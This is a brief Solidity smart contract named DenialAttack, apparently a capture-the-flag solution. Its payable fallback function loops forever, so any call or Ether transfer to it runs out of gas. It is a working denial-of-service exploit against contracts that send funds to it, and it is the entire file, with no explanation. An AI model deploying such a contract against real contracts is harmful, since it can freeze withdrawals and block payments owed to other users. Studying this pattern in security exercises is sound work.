// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

contract DenialAttack {
    constructor(){

    }
    fallback() external payable{
        while(true){}
    }
}
